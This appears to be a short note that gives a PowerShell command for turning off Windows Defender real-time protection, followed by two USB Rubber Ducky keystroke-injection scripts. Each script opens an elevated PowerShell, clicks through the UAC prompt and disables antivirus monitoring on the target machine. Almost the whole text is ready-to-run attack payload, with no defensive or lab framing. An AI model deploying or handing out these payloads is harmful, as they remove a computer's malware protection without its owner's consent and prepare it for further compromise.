Windows defender can be disabled with PS using the following command

```ps
Set-MpPreference -DisableRealtimeMonitoring $true
```

Example scripts:

_Dec 24, 2018_ 
```
REM Windows 10: Disable Windows Defender with Powershell
REM Author: Judge2020
REM author website: Judge2020.com
REM
DELAY 1000
GUI r
DELAY 200
REM Start an elevated powershell instance which will disable Windows Defender.
STRING powershell start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs
ENTER
DELAY 1000
REM if you need administrator [left, enter and delay 1000]
LEFT
ENTER
DELAY 1000
ALT y
```

Note: line with "ALT y" may not be required and could lead to error in the next line.  
_Apr 23, 2018_
```
REM Windows 10: Disable Windows Defender with Powershell
REM Author: Judge2020
REM author website: Judge2020.com
REM  
REM let the HID enumerate
DELAY 1000
GUI r
DELAY 200
REM my best attempt at a elevated powershell instance
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 1000
ALT y 
DELAY 200
STRING Set-MpPreference -DisableRealtimeMonitoring $true
ENTER
STRING exit
ENTER
```